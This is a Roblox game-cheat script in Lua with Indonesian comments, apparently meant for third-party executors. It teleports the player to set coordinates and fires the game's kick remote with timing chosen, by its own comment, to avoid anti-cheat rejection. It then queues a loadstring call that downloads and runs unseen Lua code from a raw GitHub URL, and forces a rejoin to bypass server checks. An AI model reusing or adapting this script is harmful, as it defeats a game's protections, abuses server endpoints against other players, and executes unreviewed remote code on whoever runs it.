local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

repeat task.wait() until game:IsLoaded()
    
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    -- Tunggu karakter fisikmu muncul di map
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart", 10)
    
    if hrp then
        -- Beri jeda 1 detik agar physics/map game tidak error karena baru join
        task.wait(1) 
        
        -- 1. Teleport ke CFrame SafeZone
        hrp.CFrame = CFrame.new(700.160706, 3.15000606, 232.393646)
        
        -- Beri jeda sedikit setelah teleport sebelum nendang agar tidak ditolak Anti-Cheat server
        task.wait(0.5)
        
        -- 2. Tembak Remote Kick
        pcall(function()
            local Event = game:GetService("ReplicatedStorage")
                :WaitForChild("Shared")
                :WaitForChild("Packages")
                :WaitForChild("Network")
                :WaitForChild("rev_KickEvent")
                
            Event:FireServer(1)
            print("[Napoleon] Rejoin berhasil! Teleport & Auto Kick dieksekusi.")
        end)
    end

-- ============================================================
-- 1. SCRIPT YANG AKAN BERJALAN OTOMATIS SETELAH REJOIN
-- ============================================================
local scriptSetelahRejoin = [[
    -- Tunggu sampai loading screen Roblox benar-benar selesai
    loadstring(game:HttpGet("https://raw.githubusercontent.com/vandawam/Aesthetic-Product-Showcase-frnt/refs/heads/main/src/pages/abc.lua"))()
]]



-- ============================================================
-- 2. ANTRIKAN SCRIPT KE EKSEKUTOR (QUEUE ON TELEPORT)
-- ============================================================
-- Deteksi fungsi queue dari berbagai macam eksekutor (Madium, Delta, Codex, dll)
local queueFunc = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)

if queueFunc then
    queueFunc(scriptSetelahRejoin)
    print("Script berhasil dititipkan. Bersiap rejoin...")
else
    warn("Eksekutormu tidak mendukung queue_on_teleport! Teleport otomatis mungkin akan gagal.")
end

print("Melakukan Fast Rejoin untuk bypass atribut server...")
TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
